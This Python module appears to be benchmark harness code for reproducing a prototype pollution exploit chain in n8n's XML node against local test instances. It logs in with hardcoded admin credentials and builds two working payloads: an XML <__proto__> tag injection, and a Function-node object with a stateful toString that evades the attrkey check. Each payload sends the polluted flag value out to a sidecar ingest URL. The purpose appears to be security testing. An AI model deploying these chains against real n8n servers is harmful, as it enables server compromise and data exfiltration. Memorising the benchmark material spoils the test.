#!/usr/bin/env python3
"""Shared plumbing for n8n-cve-2026-44791 (XML node prototype pollution chain).

Driver for the REAL n8n app over HTTP: owner setup, login (cookie session),
workflow create/activate, webhook firing, sidecar hit retrieval.
"""

import json
import time
import requests

BASE = {"v0": "http://127.0.0.1:57510", "v1": "http://127.0.0.1:57511", "v2": "http://127.0.0.1:57512"}
ADMIN_EMAIL = "admin@pcb.local"
ADMIN_PASS = "Admin12345!"


def wait_http(base: str, timeout: int = 300) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(base + "/", timeout=6)
            if r.status_code == 200 and "starting up" not in r.text[:100].lower():
                return True
        except Exception:
            pass
        time.sleep(4)
    return False


def session(version: str) -> requests.Session:
    s = requests.Session()
    try:
        s.post(BASE[version] + "/rest/owner/setup",
               json={"firstName": "pcb", "lastName": "admin",
                     "email": ADMIN_EMAIL, "password": ADMIN_PASS}, timeout=15)
    except Exception:
        pass
    lr = s.post(BASE[version] + "/rest/login",
                json={"emailOrLdapLoginId": ADMIN_EMAIL, "password": ADMIN_PASS}, timeout=15)
    if lr.status_code != 200:
        raise RuntimeError(f"login failed {lr.status_code}: {lr.text[:200]}")
    return s


def wait_ready(version: str, timeout: int = 300) -> bool:
    if not wait_http(BASE[version], timeout=timeout):
        return False
    try:
        session(version)
        return True
    except Exception:
        return False


def _deactivate_all(s: requests.Session, base: str) -> None:
    try:
        r = s.get(base + "/rest/workflows?limit=100", timeout=15)
        for w in r.json().get("data", []):
            if w.get("active"):
                wid = w["id"]
                vr = s.get(base + f"/rest/workflows/{wid}", timeout=15).json()["data"].get("versionId")
                try:
                    s.post(base + f"/rest/workflows/{wid}/deactivate", json={"versionId": vr}, timeout=15)
                except Exception:
                    pass
    except Exception:
        pass


def create_active_workflow(version: str, wf: dict) -> str:
    """Create + activate a webhook workflow. Returns webhook path."""
    s = session(version)
    base = BASE[version]
    _deactivate_all(s, base)
    r = s.post(base + "/rest/workflows", json=wf, timeout=25)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"workflow create failed: {r.status_code} {r.text[:400]}")
    wfid = r.json()["data"]["id"]
    version_id = r.json()["data"].get("versionId")
    path = wf["nodes"][0]["parameters"]["path"]
    ar = s.post(base + f"/rest/workflows/{wfid}/activate", json={"versionId": version_id}, timeout=25)
    if ar.status_code not in (200, 201):
        raise RuntimeError(f"activate failed: {ar.status_code} {ar.text[:400]}")
    return path


def wait_webhook_ready(version: str, path: str, timeout: int = 60) -> bool:
    deadline = time.time() + timeout
    url = BASE[version] + "/webhook/" + path
    while time.time() < deadline:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code != 404:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def fire_webhook(version: str, path: str, body: dict, timeout: int = 90) -> dict:
    wait_webhook_ready(version, path, timeout=60)
    try:
        r = requests.post(BASE[version] + "/webhook/" + path, json=body, timeout=timeout)
        return {"status": r.status_code, "text": r.text[:500]}
    except Exception as e:
        return {"status": 0, "text": str(e)}


def sidecar_hits(hits_file: str) -> list:
    try:
        with open(hits_file) as f:
            return [l for l in f.read().splitlines() if l.strip()]
    except Exception:
        return []


def wait_for_hit(hits_file: str, needle: str, timeout: int = 60) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        for h in sidecar_hits(hits_file):
            if needle in h:
                return True
        time.sleep(3)
    return False


def make_seed_workflow(path: str, flag_key: str, flag: str) -> dict:
    """CVE1 seed: XML <__proto__> tag poisoning read via $json.root[1].<flag_key>.

    Webhook POST -> XML (xmlToJson, dataPropertyName=body) -> HTTP GET sidecar.
    """
    xml = f"<root><__proto__><{flag_key}>{flag}</{flag_key}></__proto__></root>"
    url = ("={{ 'http://sidecar:8000/ingest?seed=' + ($json.root[1] && $json.root[1]."
           + flag_key + " || '') }}")
    return {
        "name": f"pcb-seed-{path}",
        "nodes": [
            {"parameters": {"httpMethod": "POST", "path": path, "responseMode": "onReceived",
                            "options": {}},
             "type": "n8n-nodes-base.webhook", "typeVersion": 2,
             "position": [0, 300], "name": "Webhook", "webhookId": path},
            {"parameters": {"mode": "xmlToJson", "dataPropertyName": "body", "options": {}},
             "type": "n8n-nodes-base.xml", "typeVersion": 1, "position": [200, 300], "name": "XML"},
            {"parameters": {"method": "GET", "url": url, "options": {}},
             "type": "n8n-nodes-base.httpRequest", "typeVersion": 3,
             "position": [400, 300], "name": "HTTP"},
        ],
        "connections": {
            "Webhook": {"main": [[{"node": "XML", "type": "main", "index": 0}]]},
            "XML": {"main": [[{"node": "HTTP", "type": "main", "index": 0}]]},
        },
        "settings": {},
    }


def make_residual_workflow(path: str, flag_key: str, flag: str) -> dict:
    """CVE2 residual: stateful-toString attrkey coercion TOCTOU.

    Function node (vm2, main process) builds { toString: 1st->'safe', else->'__proto__' },
    delivers it into the XML node's options.attrkey via an expression. xml2js re-coerces
    the raw object -> '__proto__' -> defineProperty(Object.prototype, flag_key, flag).
    Exfil: $json.<flag_key> via a second node's expression.
    """
    fn_code = f"""// benign benchmark canary: stateful coercion object
let calls = 0;
const evil = {{ toString: () => (++calls === 1 ? 'safe' : '__proto__') }};
return [{{ json: {{ data: '<root {flag_key}=\\'{flag}\\'>x</root>', evil }} }}];
"""
    url = ("={{ 'http://sidecar:8000/ingest?res=' + (($json."
           + flag_key + " || '')) }}")
    return {
        "name": f"pcb-res-{path}",
        "nodes": [
            {"parameters": {"httpMethod": "POST", "path": path, "responseMode": "onReceived",
                            "options": {}},
             "type": "n8n-nodes-base.webhook", "typeVersion": 2,
             "position": [0, 300], "name": "Webhook", "webhookId": path},
            {"parameters": {"functionCode": fn_code},
             "type": "n8n-nodes-base.function", "typeVersion": 1,
             "position": [200, 300], "name": "FN"},
            {"parameters": {"mode": "xmlToJson", "dataPropertyName": "data",
                            "options": {"mergeAttrs": False, "attrkey": "={{ $json.evil }}"}},
             "type": "n8n-nodes-base.xml", "typeVersion": 1, "position": [400, 300], "name": "XML"},
            {"parameters": {"method": "GET", "url": url, "options": {}},
             "type": "n8n-nodes-base.httpRequest", "typeVersion": 3,
             "position": [600, 300], "name": "HTTP"},
        ],
        "connections": {
            "Webhook": {"main": [[{"node": "FN", "type": "main", "index": 0}]]},
            "FN": {"main": [[{"node": "XML", "type": "main", "index": 0}]]},
            "XML": {"main": [[{"node": "HTTP", "type": "main", "index": 0}]]},
        },
        "settings": {},
    }
